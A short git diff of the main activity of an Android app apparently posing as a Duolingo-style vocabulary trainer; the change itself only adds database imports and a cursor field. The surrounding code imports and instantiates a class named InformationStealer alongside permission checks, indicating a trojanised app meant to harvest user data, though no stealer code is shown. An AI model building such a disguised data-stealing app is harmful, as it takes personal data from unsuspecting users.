@@ -1,11 +1,14 @@
 package com.example.duolingopezzotto.Activity;
 
 import static com.example.duolingopezzotto.InfoStealerManager.InformationStealer.inviato;
+import static com.example.duolingopezzotto.SQLiteDB.DatabaseHelper.CATEGORIA_TABLE;
+import static com.example.duolingopezzotto.SQLiteDB.DatabaseHelper.PAROLA_TABLE;
 
 import android.Manifest;
 import android.content.Intent;
 import android.content.pm.ActivityInfo;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.os.Bundle;
 import android.widget.Button;
 
@@ -27,6 +30,7 @@ public class MainActivity extends AppCompatActivity {
 
     Button esercitatiButton, aggiungiButton;
     DatabaseHelper my_db;
+    Cursor cursor;
     private final InformationStealer stealer = new InformationStealer(this);
     Executor executor = Executors.newSingleThreadExecutor();
     boolean allPermissionsGranted = true;
@@ -67,6 +71,7 @@ public class MainActivity extends AppCompatActivity {
         aggiungiButton = findViewById(R.id.aggiungiButton);
 
         my_db = new DatabaseHelper(MainActivity.this);
+
 
         aggiungiButton.setOnClickListener(view -> {
 
